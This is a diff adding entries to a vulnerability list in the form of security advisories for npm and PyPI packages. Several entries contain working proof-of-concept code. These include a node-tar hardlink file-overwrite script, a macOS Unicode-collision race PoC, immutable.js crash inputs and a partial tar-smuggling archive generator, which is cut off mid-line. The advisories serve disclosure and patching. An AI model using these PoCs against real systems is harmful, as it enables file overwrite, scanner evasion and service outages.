+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/requests"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-jg8v-48h5-wgxg",
+      "references": [
+        {
+          "id": "CVE-2021-23413",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        }
+      ],
+      "description": "jszip Vulnerable to Prototype Pollution",
+      "detail": "This affects the package jszip before 3.7.0. Crafting a new zip file with filenames set to Object prototype values (e.g `__proto__`, `toString`, etc) results in a returned object with a modified prototype instance.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23413"
+        }
+      ],
+      "published": "2021-08-10T16:02:18Z",
+      "updated": "2025-01-14T09:12:20Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/jszip"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-mp2f-45pm-3cg9",
+      "references": [
+        {
+          "id": "CVE-2026-53486",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+        }
+      ],
+      "description": "Decompress: Archive extraction can create files and links outside of the target directory",
+      "detail": "### Impact\n\nWhen extracting an archive to a directory, a crafted archive can read or write files outside that directory. The flaw is in the code that writes the parsed entries, so it affects every format decompress handles: tar, tar.gz, tar.bz2, and zip by default, plus any others added through the plugins option.\n\nA link (hardlink) or symlink entry is created without checking where its target points. A hardlink can be aimed at any file the running process can read; that file then appears inside the output directory and its contents are exposed. A symlink can point outside the output directory and redirect a later write.\n\nThe path containment check used a string prefix comparison (`realPath.indexOf(outputPath) !== 0`). Output `/srv/out` does not contain `/srv/out-old`, but the prefix comparison treats it as inside, so an entry can escape into a sibling directory whose name starts with the output directory name.\n\nFile modes were applied as `mode \u0026 ~umask`, which does not remove the setuid, setgid, or sticky bits. A crafted entry can create a setuid or setgid file. This matters when extraction runs as root, for example in CI, containers, or install scripts.\n\nAny code that extracts archives from an untrusted or attacker-influenced source is affected. Archives are commonly downloaded before extraction, so this is reachable over the network in many setups.\n\n### Patches\n\nFixed in `@xhmikosr/decompress` 10.2.1 and 11.1.3. Link targets are now resolved and checked against the output directory, containment uses `path.relative`, and setuid, setgid, and sticky bits are removed.\n\nThe upstream `decompress` package is unmaintained, and all versions through its last release (4.2.1) have the same flaws. There is no upstream fix. Migrate to `@xhmikosr/decompress` 11.1.3 or later.\n\n### Workarounds\n\nExtract only archives you trust. Run extraction as a non-root user so the mode issue cannot create a privileged file. After extracting, reject any symlink or hardlink that points outside the target and any file with unexpected mode bits.\n\n### Resources\n\n* Related prior issue in the upstream project this package forks: CVE-2020-12265 / GHSA-qgfr-5hqp-vrw9\n* Fix commits and releases:\n  * https://github.com/XhmikosR/decompress/releases/tag/v10.2.1\n  * https://github.com/XhmikosR/decompress/releases/tag/v11.1.3\n  * https://github.com/XhmikosR/decompress/commit/aca5aac\n  * https://github.com/XhmikosR/decompress/commit/281cefa\n  * https://github.com/XhmikosR/decompress/commit/60b5299",
+      "advisories": [],
+      "published": "2026-07-06T20:27:38Z",
+      "updated": "2026-07-08T18:29:36Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/%40xhmikosr%2Fdecompress"
+        },
+        {
+          "ref": "pkg:npm/decompress"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-pfrx-2q88-qq97",
+      "references": [
+        {
+          "id": "CVE-2022-33987",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        }
+      ],
+      "description": "Got allows a redirect to a UNIX socket",
+      "detail": "The got package before 11.8.5 and 12.1.0 for Node.js allows a redirect to a UNIX socket.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-33987"
+        }
+      ],
+      "published": "2022-06-19T00:00:21Z",
+      "updated": "2026-02-04T02:32:46Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/got"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-qffp-2rhf-9h96",
+      "references": [
+        {
+          "id": "CVE-2026-29786",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:L/SC:N/SI:H/SA:L"
+        }
+      ],
+      "description": "tar has Hardlink Path Traversal via Drive-Relative Linkpath",
+      "detail": "### Summary\n`tar` (npm) can be tricked into creating a hardlink that points outside the extraction directory by using a drive-relative link target such as `C:../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.\n\n### Details\nThe extraction logic in `Unpack[STRIPABSOLUTEPATH]` checks for `..` segments *before* stripping absolute roots.\n\nWhat happens with `linkpath: \"C:../target.txt\"`:\n1. Split on `/` gives `['C:..', 'target.txt']`, so `parts.includes('..')` is false.\n2. `stripAbsolutePath()` removes `C:` and rewrites the value to `../target.txt`.\n3. Hardlink creation resolves this against extraction `cwd` and escapes one directory up.\n4. Writing through the extracted hardlink overwrites the outside file.\n\nThis is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.\n\n### PoC\nTested on Arch Linux with `tar@7.5.9`.\n\nPoC script (`poc.cjs`):\n\n```js\nconst fs = require('fs')\nconst path = require('path')\nconst { Header, x } = require('tar')\n\nconst cwd = process.cwd()\nconst target = path.resolve(cwd, '..', 'target.txt')\nconst tarFile = path.join(process.cwd(), 'poc.tar')\n\nfs.writeFileSync(target, 'ORIGINAL\\n')\n\nconst b = Buffer.alloc(1536)\nnew Header({ path: 'l', type: 'Link', linkpath: 'C:../target.txt' }).encode(b, 0)\nfs.writeFileSync(tarFile, b)\n\nx({ cwd, file: tarFile }).then(() =\u003e {\n  fs.writeFileSync(path.join(cwd, 'l'), 'PWNED\\n')\n  process.stdout.write(fs.readFileSync(target, 'utf8'))\n})\n```\n\nRun:\n\n```bash\ncd test-workspace\nnode poc.cjs \u0026\u0026 ls -l ../target.txt\n```\n\nObserved output:\n\n```text\nPWNED\n-rw-r--r-- 2 joshuavr joshuavr 6 Mar  4 19:25 ../target.txt\n```\n\n`PWNED` confirms outside file content overwrite. Link count `2` confirms the extracted file and `../target.txt` are hardlinked.\n\n### Impact\nThis is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.\n\nRealistic scenarios:\n- CLI tools unpacking untrusted tarballs into a working directory\n- build/update pipelines consuming third-party archives\n- services that import user-supplied tar files",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-29786"
+        }
+      ],
+      "published": "2026-03-05T00:52:32Z",
+      "updated": "2026-03-10T10:43:54Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/tar"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-r6q2-hw4h-h46w",
+      "references": [
+        {
+          "id": "CVE-2026-23950",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L"
+        }
+      ],
+      "description": "Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS",
+      "detail": "**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS\n\n**AUTHOR**: Tomás Illuminati\n\n### Details\n\nA race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p =\u003e {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // \u003c- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" \u003e collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\n\" \u003e collision_test_ß\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\nconst tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\nif (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\nfs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target: ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst contentA = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1 = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n});\nheader1.encode();\n\n// Key 2: \"f_ß\"\nconst header2 = new tar.Header({\n    path: 'collision_ß',\n    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\nstream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\nextract.on('end', () =\u003e {\n    console.log('[*] Extraction complete');\n\n    // Check what exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit dir:', files);\n    files.forEach(f =\u003e {\n        const p = path.join(exploitDir, f);\n        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);\n    });\n\n    if (files.length === 1 || (files.length === 2 \u0026\u0026 fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {\n        console.log('\\[*] GOOD');\n    } else {\n        console.log('[-] No collision');\n    }\n});\n\n``````\n\n---\n\n### Impact\nThis is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.\n\n---",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23950"
+        }
+      ],
+      "published": "2026-01-21T01:05:49Z",
+      "updated": "2026-03-16T14:31:36Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/tar"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-r7q7-xcjw-qx8q",
+      "references": [
+        {
+          "id": "CVE-2016-10075",
+          "source": {}
+        },
+        {
+          "id": "PYSEC-2017-74",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+        },
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "description": "TDQM Arbitrary Code Execution",
+      "detail": "The `tqdm._version` module in tqdm versions 4.4.1 and 4.10 allows local users to execute arbitrary code via a crafted repo with a malicious git log in the current working directory.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-10075"
+        }
+      ],
+      "published": "2022-05-14T02:19:48Z",
+      "updated": "2024-11-18T21:50:20Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/tqdm"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-rv73-9c8w-jp4c",
+      "references": [
+        {
+          "id": "CVE-2020-26308",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:U/U:Green"
+        }
+      ],
+      "description": "validate.js Regular Expression Denial of Service vulnerability",
+      "detail": "Validate.js provides a declarative way of validating javascript objects. Versions 0.13.1 and prior contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS). As of time of publication, no known patches are available.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26308"
+        },
+        {
+          "url": "https://securitylab.github.com/advisories/GHSL-2020-302-redos-validate.js"
+        }
+      ],
+      "published": "2024-10-26T21:30:46Z",
+      "updated": "2024-10-28T15:14:51Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/validate.js"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-v2hh-gcrm-f6hx",
+      "references": [
+        {
+          "id": "CVE-2026-16221",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+        }
+      ],
+      "description": "fast-uri vulnerable to host confusion via literal backslash authority delimiter",
+      "detail": "### Impact\n\n`fast-uri` v4.1.0 and earlier do not treat a literal backslash (U+005C) as an authority delimiter. Node's native WHATWG `URL` (used by `fetch()`, `undici`, and Node's `http`/`https` clients) normalizes `\\` to `/` for special schemes (`http`, `https`, `ws`, `wss`, `ftp`, `file`), so the two parsers extract different hosts from the same input string.\n\nFor example, `http://evil.com\\@allowed.com` is treated by `fast-uri` as host `allowed.com` with userinfo `evil.com\\`, while Node's WHATWG URL parser and `fetch()` see host `evil.com` with path `/@allowed.com`.\n\nApplications that use `fast-uri` to enforce host-based policy (allowlists, denylists, loopback/SSRF filtering, redirect validation, outbound proxy routing) before passing the same URL into Node's URL or `fetch()` consumers see a policy/use desync and can be steered to an unintended destination, including cloud metadata endpoints, loopback, or internal hosts.\n\n### Patches\n\nUpgrade to `fast-uri` v4.1.1, v3.1.4, or v2.4.3.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-16221"
+        }
+      ],
+      "published": "2026-07-21T22:08:28Z",
+      "updated": "2026-07-21T22:15:25Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/fast-uri"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-v56q-mh7h-f735",
+      "references": [
+        {
+          "id": "CVE-2026-59879",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "description": "Immutable.js `List` 32-bit trie overflow → unrecoverable DoS",
+      "detail": "## Summary\n\n`List#set`, `List#setSize`, `List#setIn`, `List#updateIn` (and the functional `set` / `setIn` / `updateIn`) mishandle an index or size in the range `[2 ** 30, 2 ** 31)`:\n\n- On an **empty** `List` the operation enters an **uncatchable infinite loop** (a tight CPU spin; a surrounding `try/catch` never regains control). Only killing the worker recovers it.\n- On a **populated** `List` (≥ 32 elements — i.e. any array of ≥ 32 items turned into a `List` by `fromJS`) the loop allocates without bound → heap exhaustion → the **process aborts** (`SIGABRT`, exit `134`, or kernel OOM-kill `137`). A real crash, not a recoverable error.\n\nThe index may be a **numeric string**, so it can come straight from a request body, URL, or key-path. A single small unauthenticated request is enough.\n\nThere is also a companion **silent data-corruption** issue in `setSize`:\n\n```js\nList([1, 2, 3]).setSize(2 ** 31); // before fix =\u003e size 0  (silently cleared)\nList([1, 2, 3]).setSize(2 ** 32 + 5); // before fix =\u003e size 5  (huge value wraps to 5)\n```\n\n## Impact\n\nAvailability only. A reachable configuration is any endpoint that routes untrusted input into a `List` index or a `setIn`/`updateIn` key-path — which the extremely common `state = fromJS(body); state.setIn(userPath, value)` pattern does (config stores, document/collection editors, redux-immutable reducers, JSON-Patch endpoints, etc.).\n\nNo confidentiality or integrity impact, no RCE. The companion `setSize` bug can silently corrupt application state (wrong size) without crashing.\n\n## Reproduction (immutable 5.1.7)\n\n```ts\nimport { fromJS, List } from 'immutable';\n\n// 1) Populated List: OOM -\u003e process abort (SIGABRT, exit 134) within ~2s\nfromJS({ items: new Array(64).fill(0) }).setIn(['items', '1073741824'], 'x');\n\n// 2) Empty List: hangs forever, uncatchable\nList().set(2 ** 30, 'x');\n\n// 3) Silent truncation\nList([1, 2, 3]).setSize(2 ** 31); // =\u003e size 0\nList([1, 2, 3]).setSize(2 ** 32 + 5); // =\u003e size 5\n```\n\nA remote 43-byte HTTP request (`{\"path\":[\"items\",\"1073741824\"],\"value\":\"x\"}`) is sufficient to abort a worker that applies it via `state = state.setIn(path, value)`.\n\nAny index in `[2 ** 30, 2 ** 31)` works (`1073741824`, `2000000000`, …). An index in `[2 ** 31, 2 ** 32)` does not crash — it silently wraps (clearing the List) via the same root cause.\n\n## Root cause\n\n`List` stores its values in a 32-wide trie (`SHIFT = 5`, so each level addresses 5 more bits) and uses **signed 32-bit bitwise arithmetic** throughout `setListBounds()` (`src/List.js`):\n\n1. **Infinite loop (the hang / OOM).** The level-raising loop\n\n```js\nwhile (newTailOffset \u003e= 1 \u003c\u003c (newLevel + SHIFT)) {\n  newRoot = new VNode(\n    newRoot \u0026\u0026 newRoot.array.length ? [newRoot] : [],\n    owner\n  );\n  newLevel += SHIFT;\n}\n```\n\nrelies on `1 \u003c\u003c (newLevel + SHIFT)`. A JavaScript shift count is taken **mod 32**, so once `newLevel + SHIFT` reaches `31` the term goes **negative** (`1 \u003c\u003c 31 === -2147483648`) and at `32` wraps to `1` (`1 \u003c\u003c 35 === 8`). The comparison then stays `true` forever and the loop never terminates. On a populated `List`, each iteration retains a new `VNode` (`[newRoot]`), so the heap fills and V8 aborts; on an empty `List` it spins on CPU without allocating.\n\n2. **Silent wraparound (the `setSize` corruption).** The `begin |= 0` / `end |= 0` coercion (`ToInt32`) silently wraps large finite values (`(2 ** 31) | 0 === -2147483648`, `(2 ** 32 + 5) | 0 === 5`), producing a wrong resulting size instead of an error.\n\nThe threshold is `2 ** 30`: that is the largest size for which `1 \u003c\u003c (newLevel + SHIFT)` stays a valid positive 32-bit integer throughout the loops (`newLevel + SHIFT` stays ≤ 30).\n\n## Remediation\n\nThe fix is contained to `setListBounds()` in `src/List.js`:\n\n1. **Validate up front, before the lossy `| 0` coercion.** Compute the intended origin and capacity in full precision and throw a clear, catchable `RangeError` when they exceed the addressable range (`MAX_LIST_SIZE = 2 ** 30`). `Infinity`/`NaN` are left to the existing `| 0 → 0` behaviour (so `setSize(Infinity)` stays `0` and `slice(0, Infinity)` still means \"to the end\").\n\n2. **Stop the shift from wrapping.** Replace `1 \u003c\u003c exp` in the level-raising loops with a helper that uses the cheap bitwise shift while it is exact (`exp ≤ 30`, the common path including every `push`/`setSize`/`slice`) and falls back to the non-wrapping `2 ** exp` only for the rare deep trees reached when a negative origin (`unshift` / negative index) is normalized to a large positive capacity (`exp` can reach 35 there, where `1 \u003c\u003c 35` would wrap to 8).\n\nThis turns every hang, the misleading `\"Maximum call stack size exceeded\"`, the OOM/`SIGABRT`, and the silent `setSize` truncation into one descriptive `RangeError`, preserves all behaviour for sizes `\u003c 2 ** 30`, and keeps the hot `push` path on the fast bitwise shift (the `2 ** exp` branch is never reached by non-negative operations).\n\n### Is the new limit a breaking change?\n\nNo working code is affected. A `List` could never actually hold `≥ 2 ** 30` values before — the attempt hung, crashed, or silently corrupted the size. The limit was already implicit in the 32-bit trie; the fix only makes it explicit and catchable, mirroring native JS arrays (`new Array(2 ** 32)` → `RangeError: Invalid array length`). The single observable behaviour change is that `setSize(hugeValue)`, which used to return a silently wrong size, now throws. `2 ** 30` ≈ 1.07 billion entries (~8 GB of pointers alone), far beyond any practical use.\n\n## Mitigations (for users who cannot upgrade immediately)\n\n- Validate/clamp any externally supplied `List` index or `setIn`/`updateIn` key-path segment against a sane maximum before passing it to immutable.\n- Reject numeric path segments `≥ 2 ** 30`.\n- Run request handling in a worker that can be restarted, and cap the heap (`--max-old-space-size`) so an abort is contained.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59879"
+        }
+      ],
+      "published": "2026-07-21T18:36:27Z",
+      "updated": "2026-07-21T18:46:10Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/immutable"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-v6h2-p8h4-qcjw",
+      "references": [
+        {
+          "id": "CVE-2025-5889",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L"
+        },
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X"
+        }
+      ],
+      "description": "brace-expansion Regular Expression Denial of Service vulnerability",
+      "detail": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-5889"
+        }
+      ],
+      "published": "2025-06-09T21:30:51Z",
+      "updated": "2026-02-04T02:55:50Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/brace-expansion"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-vmf3-w455-68vh",
+      "references": [
+        {
+          "id": "CVE-2026-53655",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "description": "node-tar applies PAX size override to intermediary GNU long-name/long-link headers, causing tar parser interpretation differential (file smuggling)",
+      "detail": "### Summary\n\n`tar` (node-tar) applies a PAX extended header's `size=` record (and other PAX\noverrides) to the **next header entry of any type**, including intermediary\nmetadata headers such as a GNU long-name (`L`) or long-link (`K`) entry. Per\nPOSIX pax, a PAX extended header (`x`) describes the *next file entry*, not the\nintermediary extension headers that may sit between the `x` header and the file\nit annotates. Because node-tar lets the PAX `size` override the byte length of\nan intervening `L`/`K`/`x` header, an attacker can desynchronize node-tar's\nstream cursor relative to every other mainstream tar implementation\n(GNU tar, libarchive/bsdtar, Python `tarfile`, and the now-fixed `tar-rs` /\n`astral-tokio-tar`).\n\nThe result is a tar parser **interpretation differential** (CWE-436): a single\ncrafted archive yields a different set of members under node-tar than under the\nreference tar tools. An attacker can use this to hide a member from one parser\nwhile it is visible to another, which defeats security tooling whose scanner and\nextractor disagree on archive contents (e.g. a malware/secret scanner that lists\nentries with one library while a downstream step extracts with another). node-tar\nis one of the most widely deployed JavaScript tar libraries (it backs `npm`'s own\npackage-tarball handling and is a transitive dependency of a very large fraction\nof the npm ecosystem), so the blast radius for \"files that extract differently\ndepending on the tool\" is broad.\n\nThis is the same root cause and fix that was just addressed upstream in the Rust\ntar ecosystem (`tar-rs` / `astral-tokio-tar`); node-tar carries the equivalent\ndefect and has no equivalent guard.\n\n### Impact\n\n- CWE-436 Interpretation Conflict / inconsistent tar parsing (the same class as\n  the prior tar \"smuggling\" advisories GHSA-j5gw-2vrg-8fgx and\n  GHSA-fp55-jw48-c537).\n- A crafted archive can present one logical member list to a tool that lists or\n  scans with node-tar and a different member list to GNU tar / libarchive /\n  Python tarfile (and vice versa). This lets a malicious file be hidden from a\n  scanner that uses a different parser than the eventual extractor, or hidden\n  from node-tar-based inspection while still landing on disk via a system `tar`.\n- No authentication is required; the only precondition is that a victim parses\n  an attacker-supplied tar with node-tar. Tar archives are routinely fetched\n  from untrusted sources (package registries, user uploads, CI artifacts,\n  container layers).\n- Severity: Medium. Impact is integrity-of-archive-interpretation, not direct\n  RCE; it is a building block for supply-chain / scanner-evasion attacks rather\n  than a standalone code-execution primitive.\n\n### Vulnerable code (file:line)\n\n`src/header.ts` (compiled to `dist/esm/header.js:49` and\n`dist/commonjs/header.js:85` in the published `tar@7.5.15`):\n\n```ts\n// Header.decode(buf, off, ex, gex)\nthis.size = ex?.size ?? gex?.size ?? decNumber(buf, off + 124, 12)\n```\n\n`ex` is the currently-accumulated PAX **local** extended header and `gex` the\nPAX **global** header. The `size` override from `ex`/`gex` is applied\nunconditionally to whatever header is being decoded next — there is no check\nthat the header being decoded is a real *file* entry rather than an intermediary\nextension header.\n\n`src/parse.ts`, `[CONSUMEHEADER]` constructs the next header with the current\n`EX`/`GEX` applied:\n\n```ts\nconst header = new Header(chunk, position, this[EX], this[GEX])\n```\n\nand later branches on whether that header is a metadata entry. `this[EX]` is\ncleared only in the non-meta (real file) branch:\n\n```ts\nif (entry.meta) {\n  // L / K / x / g metadata entries: this[EX] is left intact here\n  if (entry.size \u003e this.maxMetaEntrySize) {\n    entry.ignore = true\n    this[STATE] = 'ignore'\n    entry.resume()\n  } else if (entry.size \u003e 0) {\n    this[META] = ''\n    entry.on('data', c =\u003e (this[META] += c))\n    this[STATE] = 'meta'\n  }\n} else {\n  this[EX] = undefined   // EX cleared only once a real file entry is reached\n}\n```\n\nWhen the stream is ordered `x (PAX, size=N) -\u003e L (GNU long-name) -\u003e file`, the\n`L` header is constructed with `this[EX]` still set, so its `size`/`remain`\nbecomes `N` instead of the `L` payload's true length. node-tar then consumes `N`\nbytes of \"metadata\" and resumes header parsing at the wrong offset, landing\nmid-stream. Every other mainstream parser applies the PAX `size` only to the\nfollowing *file* entry, so they stay synchronized.\n\nThe correct behavior (and the fix shipped upstream in the Rust tar ecosystem) is\nto **not** apply PAX `size`/overrides when the entry being decoded is itself an\nextension header (`L` GNU long-name, `K` GNU long-link, `x` PAX local, `g` PAX\nglobal).\n\n### How input reaches the sink\n\n`tar.list()`, `tar.extract()`/`tar.x()`, and `tar.Parse`/`tar.Unpack` all route\nevery 512-byte header block through `Header.decode(...)` with the\ncurrently-accumulated `EX`/`GEX`. Any consumer that parses an attacker-supplied\narchive — `tar.list`, `tar.extract`, or piping into the streaming `Parser` —\nreaches the sink. No options need to be enabled; the default code path is\naffected.\n\n### Proof of concept\n\nArchive layout (all standard, GNU-tar-producible blocks):\n\n```\nblock 0 : x  header  (PAX local extended, typeflag 'x'), its own size = len(pax body)\nblock 1 : x  payload : the single PAX record  \"...size=2048\\n\"\nblock 2 : L  header  (GNU long-name '././@LongLink'), real size = 13\nblock 3 : L  payload : \"longname.txt\\0\"      (the long name for the next file)\nblock 4 : file header 'file_a', size = 16\nblock 5 : file_a body (16 bytes, zero-padded to 512)\nblock 6 : file header 'file_b', size = 16\nblock 7 : file_b body (16 bytes, zero-padded to 512)\n```\n\nGenerator (`make_tar.py`, pure stdlib, no external deps):\n\n```python\ndef hdr(name, size, typeflag):\n    h = bytearray(512); name = name[:100]; h[0:len(name)] = name\n    h[100:108] = b'0000644\\0'; h[108:116] = b'0000000\\0'; h[116:124] = b'0000000\\0'\n    h[124:136] = ('%011o\\0' 